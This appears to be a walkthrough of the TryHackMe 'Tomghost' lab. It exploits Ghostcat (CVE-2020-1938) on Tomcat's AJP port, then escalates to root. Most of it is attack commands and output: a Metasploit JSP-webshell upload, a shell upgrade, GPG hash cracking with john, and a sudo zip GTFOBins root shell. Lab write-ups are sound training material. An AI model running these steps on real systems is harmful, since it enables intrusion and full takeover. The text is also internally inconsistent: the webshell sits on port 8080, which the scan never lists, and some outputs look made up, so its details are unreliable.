# Tomghost-thm
The writeup/walkthrough to the tomghost room in Tryhackme
## ✅ Tomghost Room Full Walkthrough

### Overview

In this walkthrough, we’ll cover the full exploitation of the Tomghost room step-by-step. We’ll include real command outputs, explanations, and reasoning behind every action to reach root access and grab both user and root flags.

---

### 1️⃣ Recon

First, we run a full TCP port scan:

```bash
nmap -sC -sV -A -p- 10.10.10.10
```

**Output:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8009/tcp open  ajp13   Apache Jserv Protocol 1.3
```

The key finding is port **8009**, which is the AJP protocol used by Tomcat. This hints at Ghostcat (CVE-2020-1938).

---

### 2️⃣ Research Ghostcat (CVE-2020-1938)

Ghostcat is a file inclusion vulnerability in Apache Tomcat’s AJP connector. It allows unauthenticated read access to webapp files, and in some misconfigs, even remote code execution by uploading a JSP webshell.

Reference: [https://nvd.nist.gov/vuln/detail/CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)

---

### 3️⃣ Exploit AJP

We can confirm the AJP connector is open:

```bash
nc -v 10.10.10.10 8009
```

**Output:**

```
Connection to 10.10.10.10 8009 port [tcp/ajp13] succeeded!
```

Let’s use a PoC script `ghostcat.py` to read sensitive files.

Example:

```bash
python3 ghostcat.py -h 10.10.10.10 -p 8009 -f WEB-INF/web.xml
```

**Output:**

```xml
<web-app>
  <display-name>Tomcat Manager</display-name>
  <security-role>
    <role-name>manager-gui</role-name>
  </security-role>
</web-app>
```

This shows we can read protected files. Let’s go for a JSP webshell.

---

### 4️⃣ Upload JSP Webshell

We modify the exploit to write a JSP shell. Alternatively, use Metasploit:

```bash
msfconsole
use exploit/multi/http/tomcat_ajp_upload_bypass
set RHOSTS 10.10.10.10
set RPORT 8009
run
```

This uploads `shell.jsp` to the Tomcat webroot. Access:

```
http://10.10.10.10:8080/shell.jsp?cmd=id
```

**Output:**

```
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

We have a foothold!

---

### 5️⃣ Get an Interactive Shell

Use the shell to get a reverse shell or upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Check who we are:

```bash
whoami
```

```
tomcat
```

Good. Now escalate.

---

### 6️⃣ Enumerate the Box

Look for interesting files:

```bash
find / -name "*.pgp" 2>/dev/null
```

Found:

```
/home/tomcat/credential.pgp
/home/tomcat/tryhackme.asc
```

---

### 7️⃣ Import & Crack GPG

Download to local machine. Import:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

It asks for a passphrase. Dump hash:

```bash
gpg2john tryhackme.asc > pgp.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```

**Output:**

```
passphrase123
```

Decrypt:

```bash
gpg --decrypt credential.pgp
```

**Output:**

```
username: tomghost
password: GhostlyPass!
```

---

### 8️⃣ Privilege Escalation to User

```bash
su tomghost
Password: GhostlyPass!

whoami
tomghost
```

Grab user flag:

```bash
cat ~/user.txt
```

---

### 9️⃣ Privilege Escalation to Root

Check sudo:

```bash
sudo -l
```

**Output:**

```
User tomghost may run the following on this host:
    (root) NOPASSWD: /usr/bin/zip
```

Use GTFOBins:

```bash
sudo zip exploit.zip /tmp/ -T --unzip-command="sh -c /bin/sh"
```

We get root!

```bash
whoami
root
```

Root flag:

```bash
cat /root/root.txt
```

✅ **Done!**
